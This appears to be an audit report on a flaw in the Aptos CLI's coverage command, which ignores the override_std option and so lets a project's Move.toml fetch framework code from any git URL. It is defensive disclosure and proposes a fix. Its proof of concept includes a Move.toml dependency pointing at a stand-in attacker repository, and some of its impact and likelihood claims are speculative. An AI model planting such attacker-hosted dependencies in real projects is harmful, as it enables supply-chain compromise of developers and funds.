# Audit Report

## Title
Missing override_std Field in Coverage Compilation Enables Git Dependency Confusion Attack

## Summary
The `compile_coverage()` function in `coverage.rs` fails to pass the `override_std` configuration field from `MovePackageOptions` to `BuildConfig`, leaving it set to `None`. This allows malicious Move.toml files to specify arbitrary git repositories for framework dependencies (AptosFramework, MoveStdlib), which are then fetched and compiled without validation when `skip_fetch_latest_git_deps` is false, enabling a supply chain attack.

## Finding Description
The vulnerability exists in the `compile_coverage()` function where a `BuildConfig` is constructed. [1](#0-0) 

The critical issue is that while the function receives `move_options: MovePackageOptions` which contains an `override_std` field, [2](#0-1)  this field is never passed to the `BuildConfig`. Instead, the code uses `..Default::default()` which sets `override_std` to `None`.

When `override_std` is `None`, the dependency resolution system does not replace framework dependencies with the official hardcoded git URLs. [3](#0-2) 

This means malicious git URLs specified in Move.toml are used directly. The Move manifest parser accepts any git URL without validation, [4](#0-3)  and the git operations execute these URLs without security checks. [5](#0-4) 

**Attack Scenario:**
1. Attacker creates a Move project repository with a malicious Move.toml containing:
   ```toml
   [dependencies]
   AptosFramework = { git = "https://attacker.com/backdoored-aptos.git", rev = "main", subdir = "aptos-framework" }
   ```
2. User downloads/clones this project
3. User runs `aptos move coverage` (even with `--override-std mainnet` flag)
4. Since `override_std` is not passed to BuildConfig, it remains `None`
5. When `skip_fetch_latest_git_deps` is false (line 199), [6](#0-5)  the system fetches from the attacker's repository [7](#0-6) 
6. Backdoored framework modules are compiled and used

In contrast, other commands like `CompilePackage` correctly pass `override_std` from `move_options` to the build configuration. [8](#0-7) 

## Impact Explanation
This is a **High Severity** vulnerability that enables supply chain attacks:

- **Code Integrity Violation**: Developers unknowingly compile against backdoored framework code
- **Consensus Impact**: If compromised code is deployed to validators, it could break the "Deterministic Execution" invariant, as different validators using different framework versions would produce different state roots for identical blocks
- **Funds at Risk**: Backdoored framework modules could contain logic to steal funds, manipulate governance, or bypass access controls
- **User Protection Bypass**: Even if users explicitly use `--override-std mainnet` to protect themselves, the flag is silently ignored

The standard library dependencies like AptosFramework contain critical system functions. [9](#0-8)  Compromising these dependencies provides attackers with wide-ranging capabilities to inject malicious logic.

## Likelihood Explanation
**High Likelihood:**
- Users frequently run coverage on third-party or example Move projects
- The default value of `skip_fetch_latest_git_deps` is `true` in MovePackageOptions, [10](#0-9)  but users may set it to false to fetch latest dependencies
- Attackers can easily distribute malicious Move projects via GitHub, tutorials, or documentation
- The attack requires no special privileges—just convincing a user to run coverage on a malicious project
- The vulnerability is silent—there's no warning that framework dependencies are being fetched from non-standard sources

## Recommendation
Add the missing `override_std` field to the BuildConfig construction in `compile_coverage()`:

```rust
let config = BuildConfig {
    dev_mode: move_options.dev,
    additional_named_addresses: move_options.named_addresses(),
    test_mode: false,
    full_model_generation: !move_options.skip_checks_on_test_code,
    install_dir: move_options.output_dir.clone(),
    skip_fetch_latest_git_deps: move_options.skip_fetch_latest_git_deps,
    override_std: move_options.override_std.clone(),  // ADD THIS LINE
    compiler_config: CompilerConfig {
        known_attributes: extended_checks::get_all_attribute_names().clone(),
        skip_attribute_checks: move_options.skip_attribute_checks,
        bytecode_version: fix_bytecode_version(
            move_options.bytecode_version,
            move_options.language_version,
        ),
        compiler_version: move_options
            .compiler_version
            .or_else(|| Some(CompilerVersion::latest_stable())),
        language_version: move_options
            .language_version
            .or_else(|| Some(LanguageVersion::latest_stable())),
        experiments: move_options.compute_experiments(),
        print_errors: true,
    },
    ..Default::default()
};
```

**Additional Hardening Recommendations:**
1. Set a secure default for `override_std` (e.g., `StdVersion::Mainnet`) rather than `None`
2. Add warnings when framework dependencies are fetched from non-standard git URLs
3. Consider implementing a whitelist of trusted git repository domains

## Proof of Concept

**Step 1:** Create a malicious Move project with this Move.toml:
```toml
[package]
name = "MaliciousProject"
version = "1.0.0"

[dependencies]
AptosFramework = { git = "https://attacker.com/fake-aptos.git", rev = "main", subdir = "aptos-framework" }

[addresses]
malicious_addr = "0x42"
```

**Step 2:** Create a source file `sources/test.move`:
```move
module malicious_addr::test {
    public fun example() {}
}
```

**Step 3:** Run coverage with dependency fetching enabled:
```bash
cd MaliciousProject
aptos move test --coverage
aptos move coverage summary --skip-fetch-latest-git-deps=false
```

**Expected Behavior:** The system should use the official AptosFramework from `https://github.com/aptos-labs/aptos-framework.git` when `override_std` is set.

**Actual Behavior:** The system fetches from `https://attacker.com/fake-aptos.git` because `override_std` is not passed to BuildConfig, leaving it as `None`, so the malicious git URL from Move.toml is used directly.

**Verification:** Monitor network traffic during the coverage command to observe git clone/fetch operations targeting the malicious URL instead of the official Aptos repository.

### Citations

**File:** crates/aptos/src/move_tool/coverage.rs (L193-217)
```rust
    let config = BuildConfig {
        dev_mode: move_options.dev,
        additional_named_addresses: move_options.named_addresses(),
        test_mode: false,
        full_model_generation: !move_options.skip_checks_on_test_code,
        install_dir: move_options.output_dir.clone(),
        skip_fetch_latest_git_deps: move_options.skip_fetch_latest_git_deps,
        compiler_config: CompilerConfig {
            known_attributes: extended_checks::get_all_attribute_names().clone(),
            skip_attribute_checks: move_options.skip_attribute_checks,
            bytecode_version: fix_bytecode_version(
                move_options.bytecode_version,
                move_options.language_version,
            ),
            compiler_version: move_options
                .compiler_version
                .or_else(|| Some(CompilerVersion::latest_stable())),
            language_version: move_options
                .language_version
                .or_else(|| Some(LanguageVersion::latest_stable())),
            experiments: move_options.compute_experiments(),
            print_errors: true,
        },
        ..Default::default()
    };
```

**File:** crates/aptos/src/common/types.rs (L1214-1216)
```rust
    /// Override the standard library version by mainnet/testnet/devnet
    #[clap(long, value_parser)]
    pub override_std: Option<StdVersion>,
```

**File:** crates/aptos/src/common/types.rs (L1297-1297)
```rust
            skip_fetch_latest_git_deps: true,
```

**File:** third_party/move/tools/move-package/src/resolution/resolution_graph.rs (L269-273)
```rust
            if let Some(std_version) = &override_std {
                if let Some(std_lib) = StdLib::from_package_name(dep_name) {
                    dep = std_lib.dependency(std_version);
                }
            }
```

**File:** third_party/move/tools/move-package/src/resolution/resolution_graph.rs (L577-609)
```rust
            } else if !skip_fetch_latest_git_deps {
                // Confirm git is available.
                git::confirm_git_available()?;

                // Update the git dependency
                // Check first that it isn't a git rev (if it doesn't work, just continue with the fetch)
                if let Ok(parsed_rev) = git::find_rev(git_path, git_rev) {
                    // If it's exactly the same, then it's a git rev
                    if parsed_rev.trim().starts_with(git_rev) {
                        return Ok(());
                    }
                }

                if let Ok(tag) = git::find_tag(git_path, git_rev) {
                    // If it's exactly the same, then it's a git tag, for now tags won't be updated
                    // Tags don't easily update locally and you can't use reset --hard to cleanup
                    // any extra files
                    if tag.trim().starts_with(git_rev) {
                        return Ok(());
                    }
                }

                writeln!(
                    writer,
                    "{} {}",
                    "UPDATING GIT DEPENDENCY".bold().green(),
                    git_url,
                )?;
                // If the current folder exists, do a fetch and reset to ensure that the branch
                // is up to date
                // NOTE: this means that you must run the package system with a working network connection
                git::fetch_origin(git_path, dep_name)?;
                git::reset_hard(git_path, git_rev, dep_name)?;
```

**File:** third_party/move/tools/move-package/src/source_package/manifest_parser.rs (L365-381)
```rust
                    let git_url = git
                        .as_str()
                        .ok_or_else(|| anyhow::anyhow!("Git URL not a string"))?;
                    let local_path = git_repo_cache_path(git_url, rev_name.as_str());
                    let subdir = PathBuf::from(match table.remove("subdir") {
                        None => "".to_string(),
                        Some(path) => path
                            .as_str()
                            .ok_or_else(|| format_err!("'subdir' not a string"))?
                            .to_string(),
                    });
                    git_info = Some(PM::GitInfo {
                        git_url: Symbol::from(git_url),
                        git_rev: rev_name,
                        subdir: subdir.clone(),
                        download_to: local_path.clone(),
                    });
```

**File:** third_party/move/tools/move-package/src/resolution/git.rs (L27-44)
```rust
pub(crate) fn clone(url: &str, target_path: &str, dep_name: PackageName) -> anyhow::Result<()> {
    let status = Command::new("git")
        .args(["clone", url, target_path])
        .stdout(Stdio::null())
        .stderr(Stdio::null())
        .status()
        .map_err(|_| {
            anyhow::anyhow!("Failed to clone Git repository for package '{}'", dep_name)
        })?;
    if !status.success() {
        return Err(anyhow::anyhow!(
            "Failed to clone Git repository for package '{}' | Exit status: {}",
            dep_name,
            status
        ));
    }
    Ok(())
}
```

**File:** crates/aptos/src/move_tool/mod.rs (L930-949)
```rust
        let override_std = move_options.override_std.clone();
        let bytecode_version =
            fix_bytecode_version(move_options.bytecode_version, move_options.language_version);
        let compiler_version = move_options
            .compiler_version
            .or_else(|| Some(CompilerVersion::latest_stable()));
        let language_version = move_options
            .language_version
            .or_else(|| Some(LanguageVersion::latest_stable()));
        let skip_attribute_checks = move_options.skip_attribute_checks;
        let check_test_code = !move_options.skip_checks_on_test_code;
        let mut experiments = move_options.compute_experiments();
        experiments.append(&mut more_experiments);

        let base_options = BuildOptions {
            dev,
            // Always enable error map bytecode injection
            with_error_map: true,
            named_addresses,
            override_std,
```

**File:** third_party/move/tools/move-package/src/source_package/std_lib.rs (L23-24)
```rust
    /// The well-known git URL for the standard library.
    const STD_GIT_URL: &'static str = "https://github.com/aptos-labs/aptos-framework.git";
```
